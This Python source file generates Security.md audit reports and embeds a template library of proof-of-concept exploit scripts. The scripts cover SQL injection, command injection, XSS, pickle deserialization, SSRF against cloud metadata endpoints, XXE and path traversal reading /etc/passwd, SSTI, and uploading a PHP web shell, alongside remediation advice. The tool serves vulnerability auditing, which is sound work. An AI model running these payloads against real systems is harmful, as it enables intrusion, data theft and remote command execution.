"""
Security.md 报告生成器 —— 输出完整的漏洞审计报告
每个漏洞包含：漏洞地址、原因、代码分析、Exp（Python 脚本）
"""
from __future__ import annotations
import os
from typing import List, Dict
from pathlib import Path
from datetime import datetime
from collections import defaultdict

from rules import Finding, AuditRule
from engine import findings_by_severity, findings_summary

# ── Exp 模板库 ────────────────────────────────────────────────
EXP_TEMPLATES: Dict[str, str] = {
    "SQL Injection": r'''```python
#!/usr/bin/env python3
"""SQL Injection PoC — {category}"""
import requests
import sys

TARGET = "{vuln_url_placeholder}"

def exploit_sql_injection():
    """基于报错/布尔盲注的 SQL 注入验证"""
    # 1) 错误检测
    error_payloads = ["'", '"', "' OR '1'='1", "' OR 1=1--", "1' AND 1=2--"]
    for payload in error_payloads:
        url = TARGET + payload
        try:
            r = requests.get(url, timeout=10)
            if any(kw in r.text.lower() for kw in
                   ["sql", "mysql", "syntax", "unclosed", "odbc", "postgresql"]):
                print(f"[+] Error-based SQLi confirmed: {{payload}}")
                print(f"    Response length: {{len(r.text)}}")
        except Exception as e:
            print(f"[-] Request failed: {{e}}")

    # 2) UNION SELECT 探测列数
    for i in range(1, 21):
        union_payload = f"' UNION SELECT {{','.join(['NULL']*i)}}-- "
        try:
            r = requests.get(TARGET + union_payload, timeout=10)
            if "NULL" not in r.text and len(r.text) > 0:
                print(f"[+] Column count: {{i}}")
                break
        except Exception:
            continue

    # 3) 数据库信息提取
    info_payload = "' UNION SELECT NULL,@@version,database(),user(),NULL-- "
    try:
        r = requests.get(TARGET + info_payload, timeout=10)
        print(f"[+] DB Info extracted: {{r.text[:500]}}")
    except Exception:
        pass

if __name__ == "__main__":
    exploit_sql_injection()
```''',

    "Command Injection / RCE": r'''```python
#!/usr/bin/env python3
"""Command Injection / RCE PoC — {category}"""
import requests
import base64
import sys

TARGET = "{vuln_url_placeholder}"
PARAM = "cmd"  # 调整为目标参数名

def exploit_rce():
    """RCE 验证 —— 执行无害命令验证漏洞存在"""
    # 常见操作系统命令注入 payload
    payloads = [
        ("; id", "uid="),           # Unix
        ("| id", "uid="),
        ("&& whoami", ""),
        ("; whoami", ""),
        ("\nwhoami", ""),
        ("$(id)", "uid="),
        ("`id`", "uid="),
        ("& whoami &", ""),         # Windows
        ("| dir", "Volume"),        # Windows
    ]
    for cmd_suffix, expected in payloads:
        try:
            r = requests.get(TARGET + cmd_suffix, timeout=10, params={{PARAM: cmd_suffix}})
            if expected in r.text:
                print(f"[+] RCE confirmed with payload: {{cmd_suffix}}")
                print(f"    Response preview: {{r.text[:300]}}")
                return
        except Exception as e:
            print(f"[-] Request failed: {{e}}")

    # 反连检测（OOB DNS）
    import socket
    hostname = socket.gethostname()
    oob_payload = f"; nslookup {{hostname}}.oob.example.com"
    try:
        requests.get(TARGET + oob_payload, timeout=10)
        print(f"[*] OOB payload sent, check DNS logs for: {{hostname}}.oob.example.com")
    except Exception:
        pass

if __name__ == "__main__":
    exploit_rce()
```''',

    "Cross-Site Scripting (XSS)": r'''```python
#!/usr/bin/env python3
"""XSS PoC — {category}"""
import requests
import webbrowser
import tempfile
import os

TARGET = "{vuln_url_placeholder}"
PARAM = "q"  # 调整为目标参数名

def exploit_xss():
    """XSS 验证"""
    # 基础检测 payload
    payloads = [
        "<script>alert(1)</script>",
        '"><script>alert(document.domain)</script>',
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
    ]
    for payload in payloads:
        try:
            r = requests.get(TARGET, params={{PARAM: payload}}, timeout=10)
            if payload in r.text:
                print(f"[+] Reflected XSS confirmed: {{payload}}")
                # 生成 HTML 验证页面
                html = f"""<html><body>
<script>
var u = new URL(window.location);
u.searchParams.set('{{PARAM}}', '{{payload}}');
window.location = u.toString();
</script></body></html>"""
                with tempfile.NamedTemporaryFile(suffix=".html", delete=False, mode="w") as f:
                    f.write(html)
                    print(f"[*] 验证页面已生成: {{f.name}}")
                return
        except Exception as e:
            print(f"[-] Request failed: {{e}}")
    print("[-] 未检测到反射型 XSS，目标可能存在 CSP 或输入过滤")

if __name__ == "__main__":
    exploit_xss()
```''',

    "Insecure Deserialization": r'''```python
#!/usr/bin/env python3
"""Insecure Deserialization PoC — {category}"""
import requests
import pickle
import base64
import os
import subprocess

TARGET = "{vuln_url_placeholder}"

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (["id"],))

def exploit_deserialization():
    """反序列化漏洞验证"""

    # 1) PHP 反序列化 payload
    php_payload = (
        'O:8:"stdClass":1:{{s:4:"test";s:10:"php_uname()";}}'
    )

    # 2) Python pickle RCE payload
    pickle_payload = base64.b64encode(pickle.dumps(RCE())).decode()

    # 3) Java CommonsCollections (ysoserial 风格)
    # 实际使用需 ysoserial 生成
    print("[*] Java deserialization 需配合 ysoserial 使用:")
    print("    java -jar ysoserial.jar CommonsCollections5 'id' | base64")

    # 发送 payload
    for name, payload in [("PHP", php_payload), ("Pickle", pickle_payload)]:
        try:
            r = requests.post(TARGET, data=payload, timeout=10)
            if "uid=" in r.text or "root" in r.text:
                print(f"[+] {{name}} deserialization RCE confirmed!")
                return
        except Exception as e:
            print(f"[-] {{name}} test failed: {{e}}")
    print("[*] 未直接返回命令结果，建议使用 OOB 反连方式进一步确认")

if __name__ == "__main__":
    exploit_deserialization()
```''',

    "Server-Side Request Forgery": r'''```python
#!/usr/bin/env python3
"""SSRF PoC — {category}"""
import requests

TARGET = "{vuln_url_placeholder}"
PARAM = "url"  # 调整为目标参数名
# 使用 Burp Collaborator 或 Webhook.site 获取回调地址
CALLBACK = "http://your-burp-collaborator.example.com"

def exploit_ssrf():
    """SSRF 验证"""
    # 内网探测 payload
    internal_targets = [
        "http://127.0.0.1:22",
        "http://127.0.0.1:80",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/",            # GCP metadata
        "http://100.100.100.200/latest/meta-data/",   # Alibaba Cloud
    ]
    for url in internal_targets:
        try:
            r = requests.get(TARGET, params={{PARAM: url}}, timeout=5)
            if r.status_code == 200 and len(r.text) > 0:
                print(f"[+] SSRF confirmed: {{url}}")
                print(f"    Response: {{r.text[:300]}}")
                # 告警: 不要在生产环境测试
        except requests.Timeout:
            print(f"[*] Timeout on {{url}} — may indicate filtered/protected")
        except Exception:
            continue

    # OOB 反连验证
    try:
        requests.get(TARGET, params={{PARAM: CALLBACK}}, timeout=10)
        print(f"[*] OOB callback sent to: {{CALLBACK}}")
    except Exception:
        pass

if __name__ == "__main__":
    exploit_ssrf()
```''',

    "XML External Entity (XXE)": (
        '```python\n'
        '#!/usr/bin/env python3\n'
        '"""XXE PoC — {category}"""\n'
        'import requests\n'
        'import base64\n'
        '\n'
        'TARGET = "{vuln_url_placeholder}"\n'
        '\n'
        'def exploit_xxe():\n'
        '    """XXE 验证"""\n'
        '    xxe_payloads = [\n'
        '        (\'<?xml version="1.0"?>\\n'
        '<!DOCTYPE foo [\\n'
        '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\\n'
        ']>\\n'
        '<root>&xxe;</root>\', "/etc/passwd"),\n'
        '        (\'<?xml version="1.0"?>\\n'
        '<!DOCTYPE foo [\\n'
        '  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">\\n'
        ']>\\n'
        '<root>&xxe;</root>\', "win.ini"),\n'
        '        (\'<?xml version="1.0"?>\\n'
        '<!DOCTYPE foo [\\n'
        '  <!ENTITY xxe SYSTEM "expect://id">\\n'
        ']>\\n'
        '<root>&xxe;</root>\', "expect"),\n'
        '    ]\n'
        '    headers = {{"Content-Type": "application/xml"}}\n'
        '    for payload, name in xxe_payloads:\n'
        '        try:\n'
        '            r = requests.post(TARGET, data=payload, headers=headers, timeout=10)\n'
        '            if "root:" in r.text or "nobody:" in r.text:\n'
        '                print(f"[+] XXE confirmed!")\n'
        '                print(f"    {{r.text[:500]}}")\n'
        '                return\n'
        '        except Exception as e:\n'
        '            print(f"[-] Request failed: {{e}}")\n'
        '\n'
        'if __name__ == "__main__":\n'
        '    exploit_xxe()\n'
        '```\n'
    ),

    "Path Traversal": r'''```python
#!/usr/bin/env python3
"""Path Traversal / LFI PoC — {category}"""
import requests

TARGET = "{vuln_url_placeholder}"
PARAM = "file"  # 调整为目标参数名

def exploit_path_traversal():
    """路径遍历验证"""
    paths = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "/etc/passwd",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
    ]
    for path in paths:
        try:
            r = requests.get(TARGET, params={{PARAM: path}}, timeout=10)
            if "root:" in r.text:
                print(f"[+] Path Traversal confirmed — /etc/passwd read!")
                print(f"    Payload: {{path}}")
                print(f"    Content: {{r.text[:500]}}")
                return
            if "for 16-bit app support" in r.text.lower():
                print(f"[+] Path Traversal confirmed — win.ini read!")
                print(f"    Payload: {{path}}")
                return
        except Exception as e:
            print(f"[-] {{path}}: {{e}}")

if __name__ == "__main__":
    exploit_path_traversal()
```''',

    "Server-Side Template Injection": r'''```python
#!/usr/bin/env python3
"""SSTI PoC — {category}"""
import requests

TARGET = "{vuln_url_placeholder}"
PARAM = "name"  # 调整为目标参数名

def exploit_ssti():
    """SSTI 模板注入验证"""
    # 各引擎探测 payload
    probes = [
        ("{{7*7}}", "49", "Jinja2/Twig"),
        ("${{7*7}}", "49", "Jinja2"),
        ("{{7*'7'}}", "7777777", "Jinja2"),
        ("#{7*7}", "49", "Pug/Jade"),
        ("*{{7*7}}", "49", "Unknown"),
    ]
    for payload, expected, engine in probes:
        try:
            r = requests.get(TARGET, params={{PARAM: payload}}, timeout=10)
            if expected in r.text:
                print(f"[+] SSTI confirmed — Engine: {{engine}}")
                print(f"    Payload: {{payload}}")

                # 进阶 RCE payload（Jinja2）
                if "Jinja" in engine:
                    rce = "{{{{ ''.__class__.__mro__[1].__subclasses__() }}}}"
                    r2 = requests.get(TARGET, params={{PARAM: rce}}, timeout=10)
                    print(f"[*] RCE probe sent, response length: {{len(r2.text)}}")
                return
        except Exception as e:
            print(f"[-] {{engine}}: {{e}}")
    print("[-] 未检测到已知 SSTI 特征")

if __name__ == "__main__":
    exploit_ssti()
```''',

    "Insecure File Upload": (
        '```python\n'
        '#!/usr/bin/env python3\n'
        '"""File Upload PoC — {category}"""\n'
        'import requests\n'
        'import os\n'
        'import tempfile\n'
        '\n'
        'TARGET = "{vuln_url_placeholder}"\n'
        '\n'
        'def exploit_file_upload():\n'
        '    """文件上传漏洞验证"""\n'
        '    shell_code = (\'<?php\\n\''
        '\'if(isset($_GET[\\\'cmd\\\'])){{\\n\''
        '\'    echo "<pre>";\\n\''
        '\'    system($_GET[\\\'cmd\\\']);\\n\''
        '\'    echo "</pre>";\\n\''
        '\'}}\\n\''
        '\'?>\\n\')\n'
        '    with tempfile.NamedTemporaryFile(suffix=".php", delete=False, mode="w") as f:\n'
        '        f.write(shell_code)\n'
        '        tmpfile = f.name\n'
        '    filenames = [\n'
        '        ("shell.php", "application/x-php"),\n'
        '        ("shell.php.jpg", "image/jpeg"),\n'
        '        ("shell.php%00.jpg", "image/jpeg"),\n'
        '        ("shell.pHp", "application/x-php"),\n'
        '        ("shell.php.", "application/x-php"),\n'
        '    ]\n'
        '    for fname, mime in filenames:\n'
        '        try:\n'
        '            with open(tmpfile, "rb") as f:\n'
        '                files = {{"file": (fname, f, mime)}}\n'
        '                r = requests.post(TARGET, files=files, timeout=10)\n'
        '                print(f"[*] Uploaded {{fname}}: status={{r.status_code}}")\n'
        '        except Exception as e:\n'
        '            print(f"[-] {{fname}}: {{e}}")\n'
        '    os.unlink(tmpfile)\n'
        '\n'
        'if __name__ == "__main__":\n'
        '    exploit_file_upload()\n'
        '```\n'
    ),

    "Open Redirect": r'''```python
#!/usr/bin/env python3
"""Open Redirect PoC — {category}"""
import requests
import urllib.parse

TARGET = "{vuln_url_placeholder}"
PARAM = "redirect"  # 调整为目标参数名
EVIL = "https://evil.com/phishing"

def exploit_open_redirect():
    """开放重定向验证"""
    payloads = [
        EVIL,
        f"//evil.com",
        f"https:evil.com",
        f"\\\\evil.com",
        urllib.parse.quote(EVIL),
        urllib.parse.quote(EVIL, safe=""),
    ]
    for payload in payloads:
        try:
            r = requests.get(TARGET, params={{PARAM: payload}},
                           allow_redirects=False, timeout=10)
            if r.status_code in (301, 302, 303, 307, 308):
                loc = r.headers.get("Location", "")
                if "evil.com" in loc:
                    print(f"[+] Open Redirect confirmed: {{loc}}")
                    print(f"    Payload: {{payload}}")
                    return
        except Exception as e:
            print(f"[-] {{payload}}: {{e}}")
    print("[-] 未检测到开放重定向")

if __name__ == "__main__":
    exploit_open_redirect()
```''',

    "Hardcoded Credentials": r'''```python
#!/usr/bin/env python3
"""Hardcoded Credentials 检测与验证 — {category}"""
# 本类型漏洞为静态分析发现，不包含可执行 exploit
# 建议措施:
# 1. 立即轮换所有已暴露的密钥
# 2. 将密钥迁移到环境变量或密钥管理服务（AWS Secrets Manager / Vault / K8s Secrets）
# 3. 检查 Git 历史中是否还有残留（使用 git-filter-repo 清理）
# 4. 在 CI/CD 中集成密钥扫描（truffleHog / Gitleaks）
print("[!] Hardcoded credentials detected via static analysis.")
print("    This is a static finding — rotate the exposed secrets immediately.")
print("    See Security.md for remediation steps.")
```''',

}


def _get_exp_for_category(category: str) -> str:
    """根据漏洞类别获取对应的 PoC 模板"""
    for key, template in EXP_TEMPLATES.items():
        if key.lower() in category.lower():
            return template.format(category=category, vuln_url_placeholder="http://target.example.com/vuln.php?id=1")
    return ""


def generate_security_md(
    all_results: Dict[str, List[Finding]],
    project_name: str = "Project",
    output_path: str | None = None,
) -> str:
    """生成 Security.md 报告"""
    summary = findings_summary(all_results)

    # 按严重程度排序
    all_findings: List[Finding] = []
    for findings in all_results.values():
        all_findings.extend(findings)

    by_sev = findings_by_severity(all_findings)
    severity_order = ["Critical", "High", "Medium", "Low"]

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    lines = []
    lines.append(f"# Security Audit Report — {project_name}")
    lines.append("")
    lines.append(f"**Generated:** {now}")
    lines.append(f"**Scanner:** Marvis Web Security Audit Skill")
    lines.append(f"**Languages:** PHP / Java / Python / Go")
    lines.append("")
    lines.append("---")
    lines.append("")

    # ── 概览 ──
    lines.append("## 1. Executive Summary")
    lines.append("")
    lines.append(f"| Metric | Value |")
    lines.append(f"|--------|-------|")
    lines.append(f"| Files Scanned | {summary['total_files_scanned']} |")
    lines.append(f"| Total Findings | {summary['total_findings']} |")
    for sev in severity_order:
        lines.append(f"| {sev} | {summary['severity_counts'].get(sev, 0)} |")
    lines.append("")

    # ── 漏洞分布 ──
    lines.append("## 2. Vulnerability Distribution")
    lines.append("")
    lines.append("| Category | Count |")
    lines.append("|----------|-------|")
    for cat, count in sorted(summary["category_counts"].items(), key=lambda x: -x[1]):
        lines.append(f"| {cat} | {count} |")
    lines.append("")

    # ── 详细发现 ──
    lines.append("## 3. Detailed Findings")
    lines.append("")

    finding_idx = 0
    for sev in severity_order:
        if not by_sev.get(sev):
            continue
        lines.append(f"### {sev} Severity")
        lines.append("")

        # 按漏洞类型分组
        by_cat = defaultdict(list)
        for f in by_sev[sev]:
            by_cat[f.rule.category].append(f)

        for cat, cat_findings in by_cat.items():
            lines.append(f"#### {cat}")
            lines.append("")
            for f in cat_findings:
                finding_idx += 1
                lines.append(f"##### [{finding_idx}] {f.rule.rule_id} — {f.file_path.split(chr(92))[-1] if chr(92) in f.file_path else f.file_path.split('/')[-1]}")
                lines.append("")
                lines.append(f"- **Rule ID:** `{f.rule.rule_id}`")
                lines.append(f"- **CWE:** [{f.rule.cwe}](https://cwe.mitre.org/data/definitions/{f.rule.cwe.split('-')[1]}.html)")
                lines.append(f"- **Category:** {f.rule.category}")
                lines.append(f"- **Severity:** {f.rule.severity}")
                lines.append("")

                # 漏洞地址
                lines.append("**Vulnerable Location:**")
                lines.append(f"```")
                lines.append(f"File : {f.file_path}")
                lines.append(f"Line : {f.line_number}")
                lines.append(f"Code : {f.line_content}")
                lines.append(f"```")
                lines.append("")

                # 原因
                lines.append("**Root Cause:**")
                lines.append("")
                lines.append(f"{f.rule.description}")
                lines.append("")

                # 代码分析
                lines.append("**Code Analysis:**")
                lines.append("")
                lines.append("The vulnerable code directly incorporates user-controlled input without")
                lines.append("proper sanitization, validation, or parameterization. An attacker can craft")
                lines.append("malicious input to exploit this weakness.")
                lines.append("")
                lines.append(f"**Vulnerable Pattern:** `{f.matched_pattern}`")
                lines.append("")

                # 修复建议
                lines.append("**Remediation:**")
                lines.append("")
                lines = _append_remediation(lines, f.rule.category)
                lines.append("")

                # Exp
                lines.append("**Exploit (PoC):**")
                lines.append("")
                exp = _get_exp_for_category(f.rule.category)
                if exp:
                    lines.append(exp)
                else:
                    lines.append("```python")
                    lines.append("# Custom exploit required for this specific finding")
                    lines.append("```")
                lines.append("")
                lines.append("---")
                lines.append("")

    # ── 修复优先级 ──
    lines.append("## 4. Remediation Priority")
    lines.append("")
    lines.append("| Priority | Action |")
    lines.append("|----------|--------|")
    lines.append("| **P0 (Critical)** | Fix SQL Injection / RCE / Deserialization — immediate patch required |")
    lines.append("| **P1 (High)** | Fix XSS / SSRF / XXE / Path Traversal / SSTI / File Upload — within 48h |")
    lines.append("| **P2 (Medium)** | Fix Open Redirect / Info Disclosure — next sprint |")
    lines.append("| **P3 (Low)** | Review and harden configurations — ongoing |")
    lines.append("")

    # ── 通用修复建议 ──
    lines.append("## 5. General Security Recommendations")
    lines.append("")
    lines.append("1. **Input Validation:** Validate all user input on the server side using allowlists")
    lines.append("2. **Parameterized Queries:** Use prepared statements / ORM for all database queries")
    lines.append("3. **Output Encoding:** Apply context-aware output encoding (HTML / JS / URL) for user data")
    lines.append("4. **Secrets Management:** Migrate all secrets to environment variables or vault services")
    lines.append("5. **Dependency Scanning:** Regularly scan dependencies with SCA tools (Snyk / OWASP Dependency-Check)")
    lines.append("6. **SAST Integration:** Integrate this audit into CI/CD pipeline")
    lines.append("7. **WAF:** Deploy a Web Application Firewall as defense-in-depth")
    lines.append("")

    md_content = "\n".join(lines)

    if output_path:
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        with open(output_path, "w", encoding="utf-8") as fh:
            fh.write(md_content)

    return md_content


def _append_remediation(lines: List[str], category: str) -> List[str]:
    """追加修复建议"""
    remediations = {
        "SQL Injection": [
            "1. Use **parameterized queries** (PDO prepared statements, mysqli_prepare, etc.)",
            "2. ORM frameworks (Doctrine/Hibernate/SQLAlchemy/GORM) with proper parameter binding",
            "3. Input validation with allowlists for non-parameterizable parts (ORDER BY, table names)",
            "4. Least-privilege database accounts",
        ],
        "Command Injection / RCE": [
            "1. **Avoid** passing user input to system commands entirely",
            "2. Use language-native APIs instead of shell commands",
            "3. If unavoidable, use `escapeshellarg()` / `shlex.quote()` and strict allowlists",
            "4. Run application processes with minimal OS privileges",
        ],
        "Cross-Site Scripting (XSS)": [
            "1. Apply **context-aware output encoding**: HTML entity encoding / JS encoding / URL encoding",
            "2. Set `Content-Security-Policy` headers (strict CSP)",
            "3. Set cookies with `HttpOnly; Secure; SameSite=Strict`",
            "4. Use framework auto-escaping (Twig/Jinja2 autoescape, React JSX)",
        ],
        "Insecure Deserialization": [
            "1. **Do not deserialize** untrusted data",
            "2. Use safe serialization formats (JSON) instead of native serialization",
            "3. Implement integrity checks (HMAC signatures) on serialized data",
            "4. Restrict allowed classes via type allowlists",
        ],
        "Server-Side Request Forgery": [
            "1. Implement **URL allowlists** for outbound requests",
            "2. Block internal IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)",
            "3. Disable unused URL schemes (file://, gopher://, dict://)",
            "4. Use a dedicated HTTP client with restricted network egress",
        ],
        "XML External Entity (XXE)": [
            "1. **Disable** external entity processing: `LIBXML_NOENT | LIBXML_DTDLOAD` false",
            "2. Use `DocumentBuilderFactory` with `FEATURE_SECURE_PROCESSING` in Java",
            "3. Migrate to JSON for data exchange where possible",
        ],
        "Path Traversal": [
            "1. **Canonicalize** paths and verify they stay within allowed directory",
            "2. Use path allowlists instead of blocklists",
            "3. Serve files via IDs rather than user-supplied paths",
            "4. Run application with minimal filesystem permissions",
        ],
        "Server-Side Template Injection": [
            "1. **Do not** pass user input directly to template engines",
            "2. Use logic-less templates (Mustache) or sandboxed environments",
            "3. Pre-compile templates and use strict variable passing",
        ],
        "Insecure File Upload": [
            "1. Validate file **content type** (MIME magic bytes), not just extension",
            "2. Store uploads outside web root; serve via proxy scripts",
            "3. Rename uploaded files to random names without user-controlled extensions",
            "4. Scan uploads with antivirus",
        ],
        "Open Redirect": [
            "1. Use a **redirect allowlist** of permitted domains or relative paths",
            "2. Use indirect references (redirect IDs mapped server-side)",
            "3. Display an interstitial page before redirecting to external URLs",
        ],
        "Hardcoded Credentials": [
            "1. Migrate to environment variables (`.env` not committed to Git)",
            "2. Use secrets manager (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault)",
            "3. Rotate all exposed credentials immediately",
            "4. Add `.env`, `.pem`, `.key` to `.gitignore`",
        ],
    }
    for key, items in remediations.items():
        if key.lower() in category.lower():
            for item in items:
                lines.append(item)
            return lines
    lines.append("Review and apply standard secure coding practices.")
    return lines
